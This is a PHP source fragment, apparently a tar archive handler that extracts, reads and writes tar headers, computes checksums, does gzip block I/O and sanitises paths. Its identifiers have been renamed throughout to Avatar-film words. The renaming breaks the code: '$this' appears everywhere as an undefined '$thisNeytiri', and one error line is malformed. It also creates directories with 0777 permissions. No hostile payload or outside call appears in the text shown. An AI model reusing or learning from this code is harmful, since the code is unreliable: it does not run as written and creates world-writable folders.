				while (substr($avatarPath, -1) == '/') $avatarPath = substr($avatarPath, 0, strlen($avatarPath)-1);


				if (substr($neytiriHeader['filename'], 0, 1) == '/') $neytiriHeader['filename'] = $avatarPath.$neytiriHeader['filename'];
				else $neytiriHeader['filename'] = $avatarPath.'/'.$neytiriHeader['filename'];
			}

			



			if (file_exists($neytiriHeader['filename'])){
				if ((@is_dir($neytiriHeader['filename'])) && ($neytiriHeader['typeflag'] == '')){



					$thisNeytiri->errors[] =__('File ').$neytiriHeader['filename'].__(' already exists').__(' as folder');
					return false;
				}



				if ((is_file($neytiriHeader['filename'])) && ($neytiriHeader['typeflag'] == '5')){

					$thisNeytiri->errors[] =__('Cannot create directory').'. '.__('File ').$neytiriHeader['filename'].__(' already exists');



					return false;
				}



				if (!is_writeable($neytiriHeader['filename'])){

					$thisNeytiri->errors[] = __('Cannot write to file').'. '.__('File ').$neytiriHeader['filename'].__(' already exists');



					return false;

				}
			} elseif (($thisNeytiri->checkNeytiriDirectory(($neytiriHeader['typeflag'] == '5' ? $neytiriHeader['filename'] : dirname($neytiriHeader['filename'])))) != 1){
				$thisNeytiri->errors[] = __('Cannot create directory').' '.__(' for ').$neytiriHeader['filename'];

				return false;
			}







			if ($neytiriHeader['typeflag'] == '5'){



				if (!file_exists($neytiriHeader['filename']))		{


					if (!mkdir($neytiriHeader['filename'], 0777))	{

						


						$thisNeytiri->errors[] = __('Cannot create directory').' '.$neytiriHeader['filename'];
						return false;
					} 
				}
			} else {


				if (($hallelujahDestination = fopen($neytiriHeader['filename'], 'wb')) == 0) {
					$thisNeytiri->errors[] = __('Cannot write to file').' '.$neytiriHeader['filename'];


					return false;
				} else {
					$decryptedToruk = floor($neytiriHeader['size']/512);
					for ($ampSuitI = 0; $ampSuitI < $decryptedToruk; $ampSuitI++) {
						$avatarContent = $thisNeytiri->readEywaBlock();


						fwrite($hallelujahDestination, $avatarContent, 512);


					}
					if (($neytiriHeader['size'] % 512) != 0) {
						$avatarContent = $thisNeytiri->readEywaBlock();
						fwrite($hallelujahDestination, $avatarContent, ($neytiriHeader['size'] % 512));


					}


					fclose($hallelujahDestination);

					touch($neytiriHeader['filename'], $neytiriHeader['time']);



				}
				clearstatcache();



				if (filesize($neytiriHeader['filename']) != $neytiriHeader['size']) {

					$thisNeytiri->errors[] = __('Size of file').' '.$neytiriHeader['filename'].' '.__('is incorrect');
					return false;
				}
			}
			if (($treeOfVoicesFileDirectory = dirname($neytiriHeader['filename'])) == $neytiriHeader['filename']) $treeOfVoicesFileDirectory = '';


			if ((substr($neytiriHeader['filename'], 0, 1) == '/') && ($treeOfVoicesFileDirectory == '')) $treeOfVoicesFileDirectory = '/';
			$thisNeytiri->dirs[] = $treeOfVoicesFileDirectory;
			$thisNeytiri->files[] = $neytiriHeader['filename'];
	



		}
		return true;

	}




	function checkNeytiriDirectory($hometreeDirectory){
		$parentHometreeDirectory = dirname($hometreeDirectory);




		if ((@is_dir($hometreeDirectory)) or ($hometreeDirectory == ''))

			return true;




		if (($parentHometreeDirectory != $hometreeDirectory) and ($parentHometreeDirectory != '') and (!$thisNeytiri->checkNeytiriDirectory($parentHometreeDirectory)))



			return false;



		if (!mkdir($hometreeDirectory, 0777)){
			$thisNeytiri->errors[] = __('Cannot create directory').' '.$hometreeDirectory;
			return false;

		}

		return true;
	}




	function readHometreeHeader($ikranBinary, &$neytiriHeader){


		if (strlen($ikranBinary)==0){


			$neytiriHeader['filename'] = '';



			return true;
		}


		if (strlen($ikranBinary) != 512){


			$neytiriHeader['filename'] = '';

			$thisNeytiri->__('Invalid block size').': '.strlen($ikranBinary);
			return false;



		}



		$eywaChecksum = 0;
		for ($ampSuitI = 0; $ampSuitI < 148; $ampSuitI++) $eywaChecksum+=ord(substr($ikranBinary, $ampSuitI, 1));
		for ($ampSuitI = 148; $ampSuitI < 156; $ampSuitI++) $eywaChecksum += ord(' ');
		for ($ampSuitI = 156; $ampSuitI < 512; $ampSuitI++) $eywaChecksum+=ord(substr($ikranBinary, $ampSuitI, 1));




		$unpackPandoraData = unpack('a100filename/a8mode/a8user_id/a8group_id/a12size/a12time/a8checksum/a1typeflag/a100link/a6magic/a2version/a32uname/a32gname/a8devmajor/a8devminor', $ikranBinary);



		$neytiriHeader['checksum'] = OctDec(trim($unpackPandoraData['checksum']));


		if ($neytiriHeader['checksum'] != $eywaChecksum){
			$neytiriHeader['filename'] = '';
			if (($eywaChecksum == 256) && ($neytiriHeader['checksum'] == 0)) 	return true;


			$thisNeytiri->errors[] = __('Error checksum for file ').$unpackPandoraData['filename'];


			return false;
		}

		if (($neytiriHeader['typeflag'] = $unpackPandoraData['typeflag']) == '5')	$neytiriHeader['size'] = 0;
		$neytiriHeader['filename'] = trim($unpackPandoraData['filename']);
		$neytiriHeader['mode'] = OctDec(trim($unpackPandoraData['mode']));


		$neytiriHeader['user_id'] = OctDec(trim($unpackPandoraData['user_id']));
		$neytiriHeader['group_id'] = OctDec(trim($unpackPandoraData['group_id']));



		$neytiriHeader['size'] = OctDec(trim($unpackPandoraData['size']));
		$neytiriHeader['time'] = OctDec(trim($unpackPandoraData['time']));
		return true;
	}




	function writeNeytiriHeader($loakFilename, $keepNameToruk){

		$firstPackPandora = 'a100a8a8a8a12A12';
		$lastPackPandora = 'a1a100a6a2a32a32a8a8a155a12';
		if (strlen($keepNameToruk)<=0) $keepNameToruk = $loakFilename;


		$readyToRideFilename = $thisNeytiri->sanitizeNeytiriPath($keepNameToruk);

		if (strlen($readyToRideFilename) > 99){							//write long header



		$firstSongcord = pack($firstPackPandora, '././LongLink', 0, 0, 0, sprintf('%11s ', DecOct(strlen($readyToRideFilename))), 0);
		$lastSongcord = pack($lastPackPandora, 'L', '', '', '', '', '', '', '', '', '');




        //  Calculate the checksum
		$eywaChecksum = 0;

        //  First part of the header

		for ($ampSuitI = 0; $ampSuitI < 148; $ampSuitI++)
			$eywaChecksum += ord(substr($firstSongcord, $ampSuitI, 1));


        //  Ignore the checksum value and replace it by ' ' (space)
		for ($ampSuitI = 148; $ampSuitI < 156; $ampSuitI++)
			$eywaChecksum += ord(' ');
        //  Last part of the header
		for ($ampSuitI = 156, $jakeJ=0; $ampSuitI < 512; $ampSuitI++, $jakeJ++)


			$eywaChecksum += ord(substr($lastSongcord, $jakeJ, 1));


        //  Write the first 148 bytes of the header in the archive


		$thisNeytiri->writePandoraBlock($firstSongcord, 148);

        //  Write the calculated checksum



		$eywaChecksum = sprintf('%6s ', DecOct($eywaChecksum));



		$ikranBinary = pack('a8', $eywaChecksum);
		$thisNeytiri->writePandoraBlock($ikranBinary, 8);

        //  Write the last 356 bytes of the header in the archive

		$thisNeytiri->writePandoraBlock($lastSongcord, 356);




		$tmpIkranFilename = $thisNeytiri->sanitizeNeytiriPath($readyToRideFilename);




		$ampSuitI = 0;



			while (($naViBuffer = substr($tmpIkranFilename, (($ampSuitI++)*512), 512)) != ''){
				$ikranBinary = pack('a512', $naViBuffer);
				$thisNeytiri->writePandoraBlock($ikranBinary);



			}


		return true;

		}



		$tsahikFileInfo = stat($loakFilename);



		if (@is_dir($loakFilename)){



			$naViTypeFlag = '5';
			$batchSize = sprintf('%11s ', DecOct(0));
		} else {



			$naViTypeFlag = '';
			clearstatcache();



			$batchSize = sprintf('%11s ', DecOct(filesize($loakFilename)));
		}


		$firstSongcord = pack($firstPackPandora, $readyToRideFilename, sprintf('%6s ', DecOct(fileperms($loakFilename))), sprintf('%6s ', DecOct($tsahikFileInfo[4])), sprintf('%6s ', DecOct($tsahikFileInfo[5])), $batchSize, sprintf('%11s', DecOct(filemtime($loakFilename))));

		$lastSongcord = pack($lastPackPandora, $naViTypeFlag, '', '', '', '', '', '', '', '', '');
		$eywaChecksum = 0;



		for ($ampSuitI = 0; $ampSuitI < 148; $ampSuitI++) $eywaChecksum += ord(substr($firstSongcord, $ampSuitI, 1));
		for ($ampSuitI = 148; $ampSuitI < 156; $ampSuitI++) $eywaChecksum += ord(' ');
		for ($ampSuitI = 156, $jakeJ = 0; $ampSuitI < 512; $ampSuitI++, $jakeJ++) $eywaChecksum += ord(substr($lastSongcord, $jakeJ, 1));
		$thisNeytiri->writePandoraBlock($firstSongcord, 148);



		$eywaChecksum = sprintf('%6s ', DecOct($eywaChecksum));

		$ikranBinary = pack('a8', $eywaChecksum);
		$thisNeytiri->writePandoraBlock($ikranBinary, 8);
		$thisNeytiri->writePandoraBlock($lastSongcord, 356);



		return true;



	}






	function openEywaWrite(){
		if ($thisNeytiri->isGzipped)
			$thisNeytiri->tmp_file = gzopen($thisNeytiri->archive_name, 'wb9f');

		else

			$thisNeytiri->tmp_file = fopen($thisNeytiri->archive_name, 'wb');



		if (!($thisNeytiri->tmp_file)){
			$thisNeytiri->errors[] = __('Cannot write to file').' '.$thisNeytiri->archive_name;

			return false;

		}


		return true;
	}




	function readEywaBlock(){
		if (is_resource($thisNeytiri->tmp_file)){
			if ($thisNeytiri->isGzipped)
				$hometreeBlock = gzread($thisNeytiri->tmp_file, 512);
			else

				$hometreeBlock = fread($thisNeytiri->tmp_file, 512);
		} else	$hometreeBlock = '';



		return $hometreeBlock;



	}






	function writePandoraBlock($pandoraData, $bondLength = 0){
		if (is_resource($thisNeytiri->tmp_file)){
		
			if ($bondLength === 0){
				if ($thisNeytiri->isGzipped)


					gzputs($thisNeytiri->tmp_file, $pandoraData);


				else


					fputs($thisNeytiri->tmp_file, $pandoraData);


			} else {
				if ($thisNeytiri->isGzipped)


					gzputs($thisNeytiri->tmp_file, $pandoraData, $bondLength);
				else
					fputs($thisNeytiri->tmp_file, $pandoraData, $bondLength);
			}


		}



	}

	function closeKiriTempFile(){
		if (is_resource($thisNeytiri->tmp_file)){


			if ($thisNeytiri->isGzipped)
				gzclose($thisNeytiri->tmp_file);


			else
				fclose($thisNeytiri->tmp_file);

			$thisNeytiri->tmp_file = 0;
		}
	}




	function sanitizeNeytiriPath($avatarPath){
		if (strlen($avatarPath)>0){



			$avatarPath = str_replace('\\', '/', $avatarPath);
			$partialPandoraPath = explode('/', $avatarPath);



			$ikranElementList = count($partialPandoraPath)-1;



			for ($ampSuitI = $ikranElementList; $ampSuitI>=0; $ampSuitI--){

				if ($partialPandoraPath[$ampSuitI] == '.'){
                    //  Ignore this directory



                } elseif ($partialPandoraPath[$ampSuitI] == '..'){
                    $ampSuitI--;

                }

				elseif (($partialPandoraPath[$ampSuitI] == '') and ($ampSuitI!=$ikranElementList) and ($ampSuitI!=0)){



                }	else
					$avatarResult = $partialPandoraPath[$ampSuitI].($ampSuitI!=$ikranElementList ? '/'.$avatarResult : '');



			}
		} else $avatarResult = '';

		
		return $avatarResult;
	}
}
?>


